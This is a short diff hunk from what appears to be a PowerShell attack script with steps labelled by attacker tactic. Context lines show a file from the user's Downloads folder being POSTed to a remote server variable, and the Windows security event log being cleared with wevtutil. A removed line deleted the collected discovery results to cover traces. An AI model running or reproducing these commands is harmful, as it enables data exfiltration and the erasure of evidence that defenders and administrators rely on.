@@ -15,6 +15,3 @@ Invoke-RestMethod -Uri $remoteServer -Method Post -InFile "$env:USERPROFILE\Down
 
 # 5. Impact - Clear event logs
 wevtutil clear-log security
-
-# 6. Defense Evasion - Delete itself
-Remove-Item -Path Join-Path $env:USERPROFILE\Downloads 'discovery_results.txt' -Force
